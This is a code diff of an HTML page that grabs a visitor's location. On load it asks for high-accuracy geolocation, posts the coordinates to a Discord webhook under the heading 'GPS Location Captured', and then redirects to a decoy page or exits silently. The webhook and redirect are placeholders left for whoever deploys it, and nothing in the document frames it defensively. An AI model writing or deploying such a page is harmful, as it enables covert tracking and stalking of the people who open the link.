@@ -7,6 +7,7 @@
   <style>
     html, body {
       margin: 0;
+      padding: 0;
       height: 100%;
       background-color: #000;
     }
@@ -14,56 +15,58 @@
 </head>
 <body>
   <script>
-    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // <-- replace with your webhook
-    const redirectUrl = "https://example.com"; // <-- replace with your redirect URL
+    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // 🔁 Replace this
+    const redirectUrl = "https://example.com"; // 🔁 Replace with your real final page
 
-    function logLocation(lat, lon, acc) {
+    function sendGPS(lat, lon, acc) {
       console.log("Latitude:", lat);
       console.log("Longitude:", lon);
-      console.log("Accuracy:", acc + " meters");
+      console.log("Accuracy:", acc + "m");
 
       fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
+          content: `📍 **GPS Location Captured**\n**Lat:** ${lat}\n**Lon:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
         })
       });
 
-      // Redirect after sending
       setTimeout(() => {
         window.location.href = redirectUrl;
-      }, 1000);
+      }, 1200);
     }
 
-    function handleError(err) {
-      console.warn("GPS error:", err);
-      // Exit if denied
-      window.location.href = "about:blank";
+    function onError(err) {
+      console.warn("Location error:", err);
+      window.location.href = "about:blank"; // Exit silently
     }
 
-    function askPermissions() {
-      // 1. Ask Notification permission
-      if ("Notification" in window) {
-        Notification.requestPermission().then(() => {});
-      }
-
-      // 2. Ask GPS permission
+    function requestLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude, accuracy } = position.coords;
-            logLocation(latitude, longitude, accuracy);
+          (pos) => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            sendGPS(latitude, longitude, accuracy);
           },
-          handleError,
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          onError,
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
         );
       } else {
-        handleError("Geolocation not supported.");
+        onError("GPS not supported");
       }
     }
 
-    window.onload = askPermissions;
+    window.addEventListener("load", () => {
+      requestLocation();
+      // Optional: ask for notification permission
+      if ("Notification" in window) {
+        Notification.requestPermission();
+      }
+    });
   </script>
 </body>
 </html>
